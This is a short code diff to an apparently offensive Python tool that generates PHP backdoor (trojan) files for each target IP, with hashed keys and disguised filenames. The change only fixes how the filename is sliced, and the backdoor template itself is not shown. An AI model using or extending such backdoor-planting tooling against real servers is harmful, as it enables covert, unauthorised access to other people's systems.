@@ -29,7 +29,7 @@ class BackdoorDescriptions:
             raw=f'sf{ips[index]}fs'
             backdoor_key=f'{hashlib.md5(raw.encode("utf-8")).hexdigest()}'
             bckFileLen=random.randint(5,20)
-            tmpFilename=f'{path}.{backdoor_key[0:{bckFileLen}]}.php'
+            tmpFilename=f'{path}.{backdoor_key[:bckFileLen]}.php'
             tmpTroj=config.backdoor_tpl.format(hashlib.md5(backdoor_key.encode("utf-8")).hexdigest(),backdoor_key[-5:])
             self.childs.append(BackdoorDescription(backdoor_key,tmpFilename,tmpTroj))
     def __getitem__(self,index):
